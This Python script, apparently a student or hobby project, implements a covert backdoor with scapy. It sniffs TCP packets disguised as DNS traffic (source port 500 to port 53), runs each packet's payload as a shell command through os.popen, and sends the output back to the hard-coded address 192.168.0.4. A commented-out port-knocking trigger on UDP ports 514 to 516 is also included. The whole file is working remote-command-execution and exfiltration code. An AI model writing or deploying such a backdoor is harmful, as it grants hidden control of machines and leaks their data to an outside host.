import sys
from scapy.all import *
import os

global clientIP
global listening

#PORT KNOCKCING STUFF
# knockCounter = 0;
# def knockFilter1(packet):
#     print "Stage 1"
#     global clientIP
#     clientIP = packet[IP].src
#     print "Client IP is %s"%(clientIP)
#     return True
# def knockFilter2(packet):
#     print "Stage 2"
#     print "Client IP is %s"%(clientIP)
#     return True
#
# def knockFilter3(packet):
#     print "Client IP is %s"%(clientIP)
#     print "PORT KNOCK COMPLETE!"
#     return True
#
#
# #As a client, listen for the port knocks
#
# sniff(filter='udp and dst port 514', stop_filter=knockFilter1)
# sniff(filter='udp and dst port 515', stop_filter=knockFilter2)
# sniff(filter='udp and dst port 516', stop_filter=knockFilter3)
#
# print "GOT HERE!"
# command = raw_input()

#Helper Functions
def receivedPacket(packet):
    if IP in packet[0]:
        srcIP = packet[IP].src
        print "Got a packet!"
        print packet.show
        print packet["Raw"].load
        command = packet["Raw"].load
        print "Command is " + command
        #Execute the command
        f = os.popen(command)
        result = f.read()
        print "RESULT IS " + result
        newPacket = (IP(dst="192.168.0.4")/TCP(sport=53, dport=500)/result)
        send(newPacket)
        return True

#Start off by listening for connections
listening = True;
while listening:
    sniff(filter='tcp and dst port 53 and src port 500', stop_filter=receivedPacket)
